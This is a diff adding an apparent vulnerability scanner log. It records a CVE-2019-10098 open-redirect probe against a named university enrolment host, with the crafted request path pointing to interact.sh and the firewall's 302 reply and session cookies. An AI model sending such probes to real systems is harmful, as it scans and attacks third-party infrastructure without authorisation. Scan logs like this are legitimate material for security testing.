@@ -1,0 +1,27 @@
+[CVE-2019-10098] Dumped HTTP request for https://enrolments.hildas.unimelb.edu.au/http://www.interact.sh
+
+
+GET /http%3A%2F%2Fwww.interact.sh HTTP/1.1
+Host: enrolments.hildas.unimelb.edu.au
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+Connection: close
+Accept: */*
+Accept-Language: en
+Accept-Encoding: gzip
+
+
+[CVE-2019-10098] Dumped HTTP response https://enrolments.hildas.unimelb.edu.au/http://www.interact.sh
+
+HTTP/1.1 302 Found
+Connection: close
+Content-Length: 122
+Cache-Control: no-cache, no-store
+Content-Type: text/html
+Location: https://enrolments.hildas.unimelb.edu.au/http%3A%2F%2Fwww.interact.sh
+Set-Cookie: visid_incap_3211538=a+5lbMPxTgagZuDRgN2T+gxyk2gAAAAAQUIPAAAAAAAzuKDKpQFCL6BhhqmLHY2V; expires=Thu, 06 Aug 2026 07:06:45 GMT; HttpOnly; path=/; Domain=.hildas.unimelb.edu.au
+Set-Cookie: incap_ses_237_3211538=ZGdxbV1rAVSU6barov5JAwxyk2gAAAAA5PNEjz47oDBfnhs4Vn2+8w==; path=/; Domain=.hildas.unimelb.edu.au
+X-Iinfo: 8-4189718-0 0NNN RT(1754493453269 43) q(0 -1 -1 -1) r(0 -1) B13(1,10037,0) U18
+
+
+<HTML><HEAD><TITLE>Loading</TITLE></HEAD><BODY bgcolor="#ffffff"><H3 style="color: #ffffff">Loading</H3></BODY></HTML>
+
